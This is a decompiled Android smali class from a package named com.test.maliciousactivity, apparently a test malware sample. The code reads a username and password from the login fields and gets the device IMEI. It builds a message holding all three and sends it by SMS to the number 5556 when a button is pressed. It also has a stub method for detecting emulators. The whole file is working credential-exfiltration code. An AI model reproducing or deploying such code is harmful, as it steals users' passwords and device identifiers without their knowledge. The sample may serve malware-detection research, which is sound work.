.class public Lcom/test/maliciousactivity/MainActivity;
.super Landroid/app/Activity;
.source "MainActivity.java"


# instance fields
.field private user:Lcom/test/maliciousactivity/User;


# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    .line 17
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    .line 19
    const/4 v0, 0x0

    iput-object v0, p0, Lcom/test/maliciousactivity/MainActivity;->user:Lcom/test/maliciousactivity/User;

    .line 17
    return-void
.end method


# virtual methods
.method public isVirtualDevices()Ljava/lang/String;
    .locals 4

    .prologue
    .line 60
    const/4 v1, 0x0

    .line 61
    .local v1, threeVal:I
    sget-object v2, Landroid/os/Build;->DEVICE:Ljava/lang/String;

    const-string v3, "generic"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_0

    .line 62
    :cond_0
    const-string v0, "false"

    .line 63
    .local v0, bool:Ljava/lang/String;
    return-object v0
.end method

.method public onBtnClicked(Landroid/view/View;)V
    .locals 13
    .parameter "v"

    .prologue
    .line 37
    invoke-virtual {p1}, Landroid/view/View;->getId()I

    move-result v8

    const v9, 0x7f070001

    if-ne v8, v9, :cond_0

    .line 39
    invoke-virtual {p0}, Lcom/test/maliciousactivity/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    .line 41
    .local v1, context:Landroid/content/Context;
    const-string v8, "phone"

    invoke-virtual {p0, v8}, Lcom/test/maliciousactivity/MainActivity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Landroid/telephony/TelephonyManager;

    .line 42
    .local v7, telephonyManager1:Landroid/telephony/TelephonyManager;
    invoke-virtual {v7}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v2

    .line 44
    .local v2, imei:Ljava/lang/String;
    iget-object v8, p0, Lcom/test/maliciousactivity/MainActivity;->user:Lcom/test/maliciousactivity/User;

    if-eqz v8, :cond_0

    .line 46
    iget-object v8, p0, Lcom/test/maliciousactivity/MainActivity;->user:Lcom/test/maliciousactivity/User;

    invoke-virtual {v8}, Lcom/test/maliciousactivity/User;->getPwdObject()Lcom/test/maliciousactivity/Password;

    move-result-object v6

    .line 47
    .local v6, pwdObject:Lcom/test/maliciousactivity/Password;
    invoke-virtual {v6}, Lcom/test/maliciousactivity/Password;->getPassword()Ljava/lang/String;

    move-result-object v5

    .line 48
    .local v5, password:Ljava/lang/String;
    const-string v4, ""

    .line 49
    .local v4, obfPwd:Ljava/lang/String;
    invoke-virtual {v5}, Ljava/lang/String;->toCharArray()[C

    move-result-object v9

    array-length v10, v9

    const/4 v8, 0x0

    :goto_0
    if-lt v8, v10, :cond_1

    .line 52
    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "User: "

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v9, p0, Lcom/test/maliciousactivity/MainActivity;->user:Lcom/test/maliciousactivity/User;

    invoke-virtual {v9}, Lcom/test/maliciousactivity/User;->getUsername()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, " + Pwd: "

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, " + Imei = "

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    .line 53
    .local v3, message:Ljava/lang/String;
    const-string v8, "5556"

    const-string v9, ""

    invoke-virtual {p0, v8, v3, v9, v1}, Lcom/test/maliciousactivity/MainActivity;->sendsms(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 56
    .end local v1           #context:Landroid/content/Context;
    .end local v2           #imei:Ljava/lang/String;
    .end local v3           #message:Ljava/lang/String;
    .end local v4           #obfPwd:Ljava/lang/String;
    .end local v5           #password:Ljava/lang/String;
    .end local v6           #pwdObject:Lcom/test/maliciousactivity/Password;
    .end local v7           #telephonyManager1:Landroid/telephony/TelephonyManager;
    :cond_0
    return-void

    .line 49
    .restart local v1       #context:Landroid/content/Context;
    .restart local v2       #imei:Ljava/lang/String;
    .restart local v4       #obfPwd:Ljava/lang/String;
    .restart local v5       #password:Ljava/lang/String;
    .restart local v6       #pwdObject:Lcom/test/maliciousactivity/Password;
    .restart local v7       #telephonyManager1:Landroid/telephony/TelephonyManager;
    :cond_1
    aget-char v0, v9, v8

    .line 50
    .local v0, c:C
    new-instance v11, Ljava/lang/StringBuilder;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v12

    invoke-direct {v11, v12}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v11, v0}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    move-result-object v11

    const-string v12, " "

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    .line 49
    add-int/lit8 v8, v8, 0x1

    goto :goto_0
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 1
    .parameter "savedInstanceState"

    .prologue
    .line 23
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 24
    const/high16 v0, 0x7f03

    invoke-virtual {p0, v0}, Lcom/test/maliciousactivity/MainActivity;->setContentView(I)V

    .line 25
    return-void
.end method

.method public onCreateOptionsMenu(Landroid/view/Menu;)Z
    .locals 2
    .parameter "menu"

    .prologue
    .line 74
    invoke-virtual {p0}, Lcom/test/maliciousactivity/MainActivity;->getMenuInflater()Landroid/view/MenuInflater;

    move-result-object v0

    const/high16 v1, 0x7f06

    invoke-virtual {v0, v1, p1}, Landroid/view/MenuInflater;->inflate(ILandroid/view/Menu;)V

    .line 75
    const/4 v0, 0x1

    return v0
.end method

.method protected onRestart()V
    .locals 5

    .prologue
    .line 28
    const v4, 0x7f070002

    invoke-virtual {p0, v4}, Lcom/test/maliciousactivity/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v3

    check-cast v3, Landroid/widget/EditText;

    .line 29
    .local v3, usernameText:Landroid/widget/EditText;
    const v4, 0x7f070003

    invoke-virtual {p0, v4}, Lcom/test/maliciousactivity/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/EditText;

    .line 30
    .local v0, passwordText:Landroid/widget/EditText;
    invoke-virtual {v3}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v4

    invoke-interface {v4}, Landroid/text/Editable;->toString()Ljava/lang/String;

    move-result-object v2

    .line 31
    .local v2, uname:Ljava/lang/String;
    invoke-virtual {v0}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v4

    invoke-interface {v4}, Landroid/text/Editable;->toString()Ljava/lang/String;

    move-result-object v1

    .line 32
    .local v1, pwd:Ljava/lang/String;
    new-instance v4, Lcom/test/maliciousactivity/User;

    invoke-direct {v4, v2, v1}, Lcom/test/maliciousactivity/User;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    iput-object v4, p0, Lcom/test/maliciousactivity/MainActivity;->user:Lcom/test/maliciousactivity/User;

    .line 33
    invoke-super {p0}, Landroid/app/Activity;->onRestart()V

    .line 34
    return-void
.end method

.method public sendsms(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
    .locals 6
    .parameter "paramString1"
    .parameter "paramString2"
    .parameter "paramString3"
    .parameter "paramContext"

    .prologue
    const/4 v5, 0x0

    .line 69
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    const/4 v2, 0x0

    new-instance v1, Landroid/content/Intent;

    const-string v3, "SMS_SENT"

    invoke-direct {v1, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-static {p4, v5, v1, v5}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v4

    new-instance v1, Landroid/content/Intent;

    const-string v3, "SMS_DELIVERED"

    invoke-direct {v1, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-static {p4, v5, v1, v5}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v5

    move-object v1, p1

    move-object v3, p2

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    .line 70
    return-void
.end method
